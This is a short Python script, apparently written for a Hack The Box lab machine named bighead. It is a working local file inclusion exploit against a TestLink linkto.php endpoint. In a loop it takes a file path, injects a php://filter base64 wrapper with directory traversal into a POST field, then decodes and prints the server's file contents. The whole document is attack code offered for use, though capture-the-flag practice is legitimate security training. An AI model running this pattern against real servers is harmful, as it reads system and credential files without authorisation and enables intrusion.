#!/usr/bin/python
import requests
import base64

def main():
	while True:
		page = raw_input("Path: ")
		LFI(page)

def LFI(page):
	cookies = {
    	'PHPSESSID': '3s2p821a6ob583mmqvjaoepc25',
	}

	headers = {
    	'Host': 'code.bighead.htb',
    	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0',
    	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    	'Accept-Language': 'en-US,en;q=0.5',
    	'Accept-Encoding': 'gzip, deflate',
    	'Connection': 'close',
    	'Upgrade-Insecure-Requests': '1',
    	'Content-Length': '74',
    	'Content-Type': 'application/x-www-form-urlencoded',
	}

	data = 'PiperID=arti&PiperCoinID=php://filter/convert.base64-encode/resource=../../../../../../{}'.format(page)

	response = requests.post('http://code.bighead.htb/testlink/linkto.php', headers=headers, cookies=cookies, data=data, verify=False)
	html = response.text
	result = html.split('<')[0]

	res = base64.b64decode(result)

#	with open('test','wb') as f:
#		f.write(res)
#		f.close()

	print res

if __name__ == "__main__":
	main()
